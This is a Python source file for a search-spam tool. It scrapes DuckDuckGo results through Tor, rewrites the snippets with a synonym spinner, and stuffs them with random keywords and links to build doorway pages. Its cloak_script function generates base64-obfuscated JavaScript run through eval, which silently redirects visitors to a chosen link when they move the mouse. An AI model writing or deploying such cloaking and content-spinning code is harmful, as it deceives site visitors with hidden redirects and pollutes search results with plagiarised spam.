import requests
import urllib.parse
import random
import time
from bs4 import BeautifulSoup
import base64
import config
import json
import globals

searchurl = "https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion/html/"

def spin_bot(stc_spin):
 finalstc = ""
 i = 0
 phrase = stc_spin
 while i < len(phrase):
  if phrase[i] == "[" and phrase[i+1] == "[":
   i+=2
   dzsz = ""
   while i < len(phrase):
    dzsz += phrase[i]
    i+=1
    if phrase[i] == "]" and phrase[i+1] == "]":
     break
   i+=2
   finalstc += random.choice(dzsz.split("|"))
  else: 
   finalstc += phrase[i]
   i+=1
 return finalstc

def spinit(pnew):
 return spin_bot(pnew)

with open("data/synonyms.jsonl", "rb") as file:
 for line in file.read().splitlines():
  line = json.loads(line)
  if line["word"] in globals.syns:
   synscr = globals.syns[line["word"]].split(",")
   line["synonyms"].append(line["word"])
   synscr.extend(line["synonyms"])
   synscr = list(set(synscr))
   synscurr = ",".join(synscr)
   globals.syns[line["word"]] = synscurr
  else:
   line["synonyms"] = list(set(line["synonyms"]))
   synscurr = ",".join(line["synonyms"])
   globals.syns[line["word"]] = synscurr

def spin_iter(sentence, iternum, maxsyns):
 spun = sentence
 for i in range(iternum):
  spun = synonymize(spun, maxsyns)
  spun = spinit(spun)  
 return spun

def addlinks(ltext): 
 ltext = ltext.split(" ")
 for i in range(len(ltext)):
  if random.randint(1, 5) == 2:
   ltext[i] = "<a href=\"{}\">{}</a>".format(random.choice(globals.links), ltext[i])
 return " ".join(ltext)

def addkeywords(ltext, keywords): 
 ltext = ltext.split(" ")
 for i in range(len(ltext)):
  if random.randint(1, 5) == 2:
   ltext[i] = "{} {}".format(random.choice(keywords), ltext[i])
 return " ".join(ltext)

def synonymize(phrase, maxsyns):
 phrase = phrase.split(" ")
 pnew = ""
 for ppart in phrase:
  ppart = ppart.lower()
  if ppart in globals.syns and not ppart in globals.stopwords:
   synscurr = globals.syns[ppart].lower().split(",")
   synscurr = synscurr[:maxsyns]
   pnew += " [[{}|{}]]".format(ppart, "|".join(synscurr))
  else:
   pnew += " {}".format(ppart)
 pnew = pnew.strip()
 return pnew

def cloak_script():
 link = random.choice(globals.links)
 script = "if(navigator.userAgent.toLowerCase().indexOf(\"bot\")) {"
 fuck = f"document.location.href=\"{link}\"; window.onmouseover = null;";
 script += "window.onmouseover = function() { "+fuck+" }"
 script += "}"
 script = base64.b64encode(script.encode()).decode()
 script = f"eval(atob(\"{script}\"));"
 return script

def getkeywords(keyword):
 try:
  words_collected = []
  s = requests.Session()
  querywordq = urllib.parse.quote_plus(keyword)
  url = f"https://duckduckgo.com/ac/?q={querywordq}+&kl=wt-wt"
  r = s.get(url=url)
  words = json.loads(r.text)
  for word in words:
   word = word["phrase"]
   words_collected.append(word)
  return words_collected
 except:
  return keyword

def get_results_from_page(keyword):
 curua = "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0"
 headers = {
 'User-Agent': '{}'.format(curua),
 'Origin': 'https://html.duckduckgo.com',
 'Referer': 'https://html.duckduckgo.com/',
 'Connection':'close'
 }
 proxies = {
  "http":"socks5h://127.0.0.1:9050",
  "https":"socks5h://127.0.0.1:9050"
 }
 data = {
  'q':'{}'.format(urllib.parse.quote_plus(keyword)),
  'b':''
 }
 surlcurr = "{}?q={}".format(searchurl, urllib.parse.quote_plus(keyword))
 # r=requests.post(url=searchurl, data=data, headers=headers, proxies=proxies, timeout=5, allow_redir>
 r=requests.get(url=surlcurr, headers=headers, proxies=proxies, timeout=5, allow_redirects=False)
 r.close()
 soup = BeautifulSoup(r.text, "html.parser")
 linkz = soup.find_all("a", {"class":"result__snippet"})
 random.shuffle(linkz)
 fdata = ""
 titles = []
 titlez = soup.find_all("a", {"class":"result__a"})
 for title in titlez:
  titletext = spin_iter(title.text, 1, 50)
  titles.append(titletext)
 titpost = random.choice(titles)
 fdata += "<h1>{}</h1>".format(titpost)
 for link in linkz:
  ltext = spin_iter(link.text, 1, 50)
  ltext = addlinks(ltext)
  keywordsfound = getkeywords(keyword)
  ltext = addkeywords(ltext, keywordsfound)
  try:
   fdata += "\n<h2>{}</h2>\n<p>{}</p>".format(random.choice(titles), ltext)
  except Exception as error:
   pass
 return titpost,fdata
